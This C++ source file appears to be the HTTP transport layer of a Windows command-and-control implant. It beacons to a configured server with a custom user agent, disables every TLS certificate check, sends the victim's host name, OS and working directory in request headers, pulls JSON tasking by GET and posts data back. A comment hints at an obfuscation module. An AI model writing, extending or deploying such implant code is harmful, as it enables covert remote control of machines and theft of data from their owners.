#include <cwchar>
#include <string>
#include <iostream>

#include "Instance.h"
// #include "Obfuscation.h"
#include "Transportion.h"

namespace spear
{
    // ? I don't know if using so many return is a good idea.
    /// @brief 
    /// @param uri 
    /// @return 
    nlohmann::json Transporter::HttpGet(const std::wstring& uri)
    {
        std::wstring tempHeader;
        DWORD blockSize;
        DWORD readSize;
        nlohmann::json respone;
        hRequest = Win32::WinHttpOpenRequest(
            hConnect,
            L"GET",
            uri.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE
        );
        if (!hRequest)
        {
            // std::cout << "[ERROR][Request][Get]: " << GetLastError() <<std::endl; // ! error
            return {};
        }
        
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID    |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID      |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        if (!Win32::WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
        {
            // std::cout << "[ERROR][Set][Get]: " << GetLastError() <<std::endl; // ! error
            Win32::WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return {};
        }    

        tempHeader = std::wstring(L"Host-Name: ");
        tempHeader.append(Instance.Info.hostName);
        Win32::WinHttpAddRequestHeaders(
            hRequest,
            tempHeader.c_str(),
            tempHeader.size(),
            WINHTTP_ADDREQ_FLAG_ADD
        );
        
        tempHeader = std::wstring(L"OS: ");
        tempHeader.append(Instance.Info.os);
        Win32::WinHttpAddRequestHeaders(
            hRequest,
            tempHeader.c_str(),
            tempHeader.size(),
            WINHTTP_ADDREQ_FLAG_ADD
        );
        
        tempHeader = std::wstring(L"Cwd: ");
        tempHeader.append(Instance.Info.cwd);
        Win32::WinHttpAddRequestHeaders(
            hRequest,
            tempHeader.c_str(),
            tempHeader.size(),
            WINHTTP_ADDREQ_FLAG_ADD
        );

        if (!Win32::WinHttpSendRequest(
            hRequest,
            NULL, 0, NULL, 0, 0, 0
        ))
        {
            // std::cout << "[ERROR][Send][Get]: " << GetLastError() <<std::endl; // ! error
            Win32::WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return {};
        }

        if (!Win32::WinHttpReceiveResponse(hRequest, NULL))
        {
            // std::cout << "[ERROR][ReceiveResponse][Get]: " << GetLastError() <<std::endl; // ! error
            Win32::WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return {};
        }

        if (!Win32::WinHttpQueryDataAvailable(hRequest, &blockSize))
        {
            // std::cout << "[ERROR][QueryDataAvailable][Get]: " << GetLastError() <<std::endl; // ! error
            Win32::WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return {};
        }

        LPVOID buffer = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, blockSize);
        if (!Win32::WinHttpReadData(
            hRequest,
            buffer,
            blockSize,
            &readSize
        ))
        {
            // std::cout << "[ERROR][Read][Get]: " << GetLastError() <<std::endl; // ! error
            Win32::WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return {};
        }

        respone = nlohmann::json::parse((const char*)buffer);
        LocalFree(buffer);
        Win32::WinHttpCloseHandle(hRequest);
        hRequest = NULL;
        return respone;
    }

    /// @brief 
    /// @param uri 
    /// @param data 
    /// @return 
    bool Transporter::HttpPost(const std::wstring& uri, const nlohmann::json& data)
    {
        hRequest = Win32::WinHttpOpenRequest(
            hConnect,
            L"POST",
            uri.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE
        );
        if (!hRequest)
        {
            // std::cout << "[ERROR][Request][Post]: " << GetLastError() <<std::endl; // ! error
            return false;
        }
        
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID    |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID      |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        if (!Win32::WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
        {
            // std::cout << "[ERROR][Set][Post]: " << GetLastError() <<std::endl; // ! error
            Win32::WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return false;
        }    

        if (!Win32::WinHttpSendRequest(
            hRequest,
            L"Content-Type: application/json",
            31,
            (LPVOID)data.dump().c_str(),
            data.dump().size(),
            data.dump().size(), 0
        ))
        {
            std::cout << "[ERROR][Send][Post]: " << GetLastError() <<std::endl; // ! error
            Win32::WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return false;
        }

        // DWORD BytesWritten = 0;
        // if (!Win32::WinHttpWriteData(
        //     HinternetList.hRequest,
        //     data.dump().c_str(),
        //     data.size(),
        //     &BytesWritten
        // ))
        // {
        //     std::cout << "[Send] create hinternet error: " << GetLastError() <<std::endl; // ! error
        //     CloseAll(&HinternetList);
        //     return false;
        // }
        
        // if (!Win32::WinHttpReceiveResponse(hRequest, NULL))
        // {
        //     std::cout << "[ERROR][ReceiveResponse][Post]: " << GetLastError() <<std::endl; // ! error
        //     Win32::WinHttpCloseHandle(hRequest);
        //     hRequest = NULL;
        //     return false;
        // }

        Win32::WinHttpCloseHandle(hRequest);
        hRequest = NULL;
        return true;
    }

    Transporter::Transporter()
    {
        hSession = Win32::WinHttpOpen(
            Instance.Config.userAgent.c_str(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0
        );
        if (!hSession)
        {
            // std::cerr << "[ERROR][Session]: " << GetLastError() << std::endl;
            CloseAll();
            ExitProcess(1);
        }

        hConnect = Win32::WinHttpConnect(
            hSession,
            Instance.Config.Address.server.c_str(),
            Instance.Config.Address.port,
            0
        );
        if (!hSession)
        {
            // std::cerr << "[ERROR][Connect]: " << GetLastError() << std::endl;
            CloseAll();
            ExitProcess(1);
        }
    }
}